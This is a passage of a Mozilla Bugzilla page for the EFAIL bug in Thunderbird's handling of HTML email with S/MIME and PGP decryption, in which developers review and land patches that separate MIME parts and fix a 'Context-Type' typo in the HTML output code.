      <tr id="ar-a15572834_101158">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15572834_101158">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 13:22 PDT" data-time="1526847725">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979062&amp;action=edit"
           title="1419417-remove-monkey-patch.patch"
           class=""
        >Attachment #8979062</a> -
        Flags: review?(mkmelin+mozilla) &rarr; review+</div></div></div><div class="change-set" id="c151"><div class="comment" data-id="13291603" data-no="151"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-151" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15572834_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15572834_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-151"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-151" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c151">Comment 151</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 13:26 PDT" data-time="1526847965">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-151">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-151" data-comment-id="13291603">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8979061" name="attach_8979061" title="1419417-fix-tests.patch (v2)">attachment 8979061</a> <a href="/attachment.cgi?id=8979061&amp;action=edit" title="1419417-fix-tests.patch (v2)">[details]</a> <a href="/attachment.cgi?id=8979061&amp;action=diff" title="1419417-fix-tests.patch (v2)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979061'>[review]</a>
1419417-fix-tests.patch (v2)

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8979061" name="attach_8979061" title="1419417-fix-tests.patch (v2)">attachment 8979061</a> <a href="/attachment.cgi?id=8979061&amp;action=edit" title="1419417-fix-tests.patch (v2)">[details]</a> <a href="/attachment.cgi?id=8979061&amp;action=diff" title="1419417-fix-tests.patch (v2)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979061'>[review]</a>:
-----------------------------------------------------------------

::: mailnews/mime/src/mimeTextHTMLParsed.cpp
&#64;&#64; +71,5 &#64;&#64;
<span class="quote">&gt;      PR_Free(content_type);
&gt;      if (charset)
&gt;      {
&gt;        nsAutoCString charsetline(
&gt; +        &quot;\n&lt;meta http-equiv=\&quot;content-type\&quot; content=\&quot;text/html; charset=&quot;);</span >

dunno what this change is about. But the whole outputting of http-equiv here looks wrong to me, pre previous comments</pre></div><div class="change-set" id="c152"><div class="comment" data-id="13291615" data-no="152"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-152" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15572834_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15572834_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-152"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-152" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c152">Comment 152</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 14:18 PDT" data-time="1526851127">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-152">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-152" data-comment-id="13291615">Magnus, the current code is erroneously using &quot;Context-Type&quot;, see:
<a rel="nofollow" href="https://dxr.mozilla.org/comm-central/rev/9c9d0d5d6c8292e20b06cc895ed3b97eb55afe4f/mailnews/mime/src/mimethsa.cpp#82">https://dxr.mozilla.org/comm-central/rev/9c9d0d5d6c8292e20b06cc895ed3b97eb55afe4f/mailnews/mime/src/mimethsa.cpp#82</a>

The new code, which is an adaption of mimethsa.cpp copied this error, also had it. I noticed when making the test work, so I corrected it.

Let me reshuffle the patches. Until the test patch has r+, I cannot land this. Also, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a> is blocking the fix here since we would be using incorrect DOM for all HTML views, not just simple.</pre></div><div class="change-set" id="c153"><div class="comment" data-id="13291616" data-no="153"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-153" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15572834_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15572834_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-153"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-153" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c153">Comment 153</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 14:21 PDT" data-time="1526851272">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-153">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979120"
         class="attachment patch"
         data-id="8979120" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-parse-html-4.diff">
      <meta itemprop="contentSize" content="14336">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979120">
          <a class="link" href="attachment.cgi?id=8979120&amp;action=diff">
        <span id="att-8979120-description" itemprop="description">Separate MIME parts from each other, v4b (trunk only, with clean-up)</span></a>
        — <a href="attachment.cgi?id=8979120&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979120">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-153" data-comment-id="13291616">Is this what you meant? I've fixed the &quot;Context&quot;.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979059&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk only, with clean-up)"
           class=""
        >Attachment #8979059</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c154"><div class="comment" data-id="13291618" data-no="154"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-154" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15572834_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15572834_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-154"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-154" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c154">Comment 154</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 14:21 PDT" data-time="1526851314">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-154">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-154" data-comment-id="13291618">See changes here:
<a rel="nofollow" href="https://bugzilla.mozilla.org/attachment.cgi?oldid=8979059&amp;action=interdiff&amp;newid=8979120&amp;headers=1">https://bugzilla.mozilla.org/attachment.cgi?oldid=8979059&amp;action=interdiff&amp;newid=8979120&amp;headers=1</a></pre></div><div class="change-set" id="c155"><div class="comment" data-id="13291620" data-no="155"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-155" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15572834_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15572834_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-155"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-155" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c155">Comment 155</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 14:25 PDT" data-time="1526851536">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-155">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979122"
         class="attachment patch"
         data-id="8979122" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1419417-fix-tests.patch">
      <meta itemprop="contentSize" content="2690">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979122">
          <a class="link" href="attachment.cgi?id=8979122&amp;action=diff">
        <span id="att-8979122-description" itemprop="description">1419417-fix-tests.patch (v2)</span></a>
        — <a href="attachment.cgi?id=8979122&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979122">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-155" data-comment-id="13291620">Same test fixed, but &quot;repair&quot; hunks moved elsewhere.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979061&amp;action=edit"
           title="1419417-fix-tests.patch (v2)"
           class=""
        >Attachment #8979061</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8979061&amp;action=edit"
           title="1419417-fix-tests.patch (v2)"
           class=""
        >Attachment #8979061</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div><div class="change">
        <a href="/attachment.cgi?id=8979122&amp;action=edit"
           title="1419417-fix-tests.patch (v2)"
           class=""
        >Attachment #8979122</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c156"><div class="comment" data-id="13291623" data-no="156"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-156" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15572834_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15572834_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-156"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-156" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c156">Comment 156</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 14:30 PDT" data-time="1526851803">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-156">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979123"
         class="attachment patch obsolete"
         data-id="8979123" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1419417-fix-mimethsa.patch">
      <meta itemprop="contentSize" content="1913">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979123">
          <a class="link" href="attachment.cgi?id=8979123&amp;action=diff">
        <span id="att-8979123-description" itemprop="description">1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979123&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979123">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-156" data-comment-id="13291623">Here you go.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979123&amp;action=edit"
           title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]"
           class=""
        >Attachment #8979123</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c157"><div class="comment" data-id="13291653" data-no="157"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-157" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15572834_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15572834_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-157"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-157" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c157">Comment 157</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 15:25 PDT" data-time="1526855147">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-157">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-157" data-comment-id="13291653">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8979123" name="attach_8979123" title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]">attachment 8979123</a> <a href="/attachment.cgi?id=8979123&amp;action=edit" title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]">[details]</a> <a href="/attachment.cgi?id=8979123&amp;action=diff" title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979123'>[review]</a>
1419417-fix-mimethsa.patch [landed in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - HTML Sanitizer class cleanup"
   href="/show_bug.cgi?id=1462481#c11">bug 1462481 comment #11</a>]

To advance proceedings, I've landed this as part of <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - HTML Sanitizer class cleanup"
   href="/show_bug.cgi?id=1462481">bug 1462481</a>:
<a rel="nofollow" href="https://hg.mozilla.org/comm-central/rev/1dd08f49b8dd52533738f6471621097c3638e5ab">https://hg.mozilla.org/comm-central/rev/1dd08f49b8dd52533738f6471621097c3638e5ab</a></pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979123&amp;action=edit"
           title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]"
           class=""
        >Attachment #8979123</a> -
        Flags: review?(mkmelin+mozilla) &rarr; review+</div></div></div><div class="change-set" id="a15580418_176914"><div class="change" id="aa15580418_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15580418_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15580418_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15580418_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15580418_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15580418_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 15:28 PDT" data-time="1526855309">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979123&amp;action=edit"
           title="1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]"
           class=""
        >Attachment #8979123</a> -
        Attachment description: 1419417-fix-mimethsa.patch &rarr; 1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]</div></div></div><div class="change-set" id="c158"><div class="comment" data-id="13293156" data-no="158"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-158" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15580418_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15580418_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-158"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-158" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c158">Comment 158</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 23:00 PDT" data-time="1526882407">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-158">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-158" data-comment-id="13293156"><span class="quote">&gt; this is not fixing it for reply/fwd.</span >

Magnus, could you please elaborate?

Compare <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c63">comment 63</a>.</pre></div><div class="change-set" id="a15607538_22599"><div class="change" id="aa15607538_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15607538_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15607538_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15607538_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15607538_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15607538_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 23:00 PDT" data-time="1526882429">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: needinfo?(mkmelin+mozilla)</div></div></div><div class="change-set" id="a15609320_22599"><div class="change" id="aa15609320_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15609320_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15609320_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15609320_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15609320_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15609320_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 23:30 PDT" data-time="1526884211">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979120&amp;action=edit"
           title="Separate MIME parts from each other, v4b (trunk only, with clean-up)"
           class=""
        >Attachment #8979120</a> -
        Flags: review-</div></div></div><div class="change-set" id="a15609347_22599"><div class="change" id="aa15609347_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15609347_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15609347_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15609347_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15609347_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15609347_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 23:30 PDT" data-time="1526884238">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Attachment is obsolete: false</div></div></div><div class="change-set" id="a15610037_22599"><div class="change" id="aa15610037_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15610037_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15610037_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15610037_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15610037_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15610037_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 23:42 PDT" data-time="1526884928">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WORKSFORME - Crash on startup for self-built Thunderbird"
   href="/show_bug.cgi?id=1463047">1463047</a></div></div></div><div class="change-set" id="c159"><div class="comment" data-id="13293188" data-no="159"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-159" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15610037_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15610037_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-159"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-159" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c159">Comment 159</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 23:48 PDT" data-time="1526885338">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-159">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-159" data-comment-id="13293188">Ben:
<span class=""><a href="/attachment.cgi?id=8979120" name="attach_8979120" title="Separate MIME parts from each other, v4b (trunk only, with clean-up)">Attachment #8979120</a> <a href="/attachment.cgi?id=8979120&amp;action=edit" title="Separate MIME parts from each other, v4b (trunk only, with clean-up)">[details]</a> <a href="/attachment.cgi?id=8979120&amp;action=diff" title="Separate MIME parts from each other, v4b (trunk only, with clean-up)">[diff]</a></span> - Flags: review-

It's your own code cleaned up, so why the r-? By mistake?
All I changed was
- fixed &quot;Context&quot;
- white-space issues
- removed conditional code.</pre></div><div class="change-set" id="a15610803_176914"><div class="change" id="aa15610803_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15610803_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15610803_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15610803_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15610803_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15610803_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-20 23:54 PDT" data-time="1526885694">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
